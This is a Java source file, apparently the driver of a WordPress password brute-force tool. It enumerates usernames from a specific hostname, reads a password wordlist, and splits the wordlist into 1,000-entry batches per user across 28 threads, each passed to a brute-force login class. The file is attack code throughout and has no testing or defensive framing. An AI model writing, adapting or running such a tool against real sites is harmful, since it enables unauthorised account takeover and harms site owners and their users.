import me.tongfei.progressbar.ProgressBar;

import java.io.BufferedReader;
import java.io.FileReader;
import java.util.ArrayList;
import java.util.concurrent.Semaphore;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;

public class main {
    public static Pipe<ArrayList<String>> usernames = new Pipe<ArrayList<String>>();

    public static void main(String[] args) throws Exception {
        ArrayList<String> users = new ArrayList<>();
        final int THREADS = 28;
        String host = "https://exchtest.nagios.org";
        ThreadFactory ThreadFactory = Executors.defaultThreadFactory();
        ExecutorService executor = Executors.newFixedThreadPool(THREADS, ThreadFactory);

        executor.submit(new getUsernameJson(host));
        executor.shutdown();

        while (!executor.isTerminated()) {
            users = usernames.take();
            break;
        }

        ArrayList<String> wordlist = new ArrayList<>();

        try (BufferedReader in = new BufferedReader(new FileReader("best1.txt"))) {
            String line;
            while ((line = in.readLine()) != null) {
                wordlist.add(line);
            }
        }

        //ProgressBar pb = new ProgressBar("Complete", wordlist.size() * users.size()); // name, initial max
        //pb.start();
        executor = Executors.newFixedThreadPool(THREADS, ThreadFactory);


        for (String user : users) {
            int x = 0;
            int y = 1000;
            for (int t = 0; t < wordlist.size() / 1000; t++) {
                executor.execute(new bruteForceWordpress(host, user, wordlist.subList(x, y + x)));
                x = x + 1000;
            }
        }
        executor.shutdown();
        while (!executor.isTerminated()) {
        }

        //pb.stop();
        return;
    }

}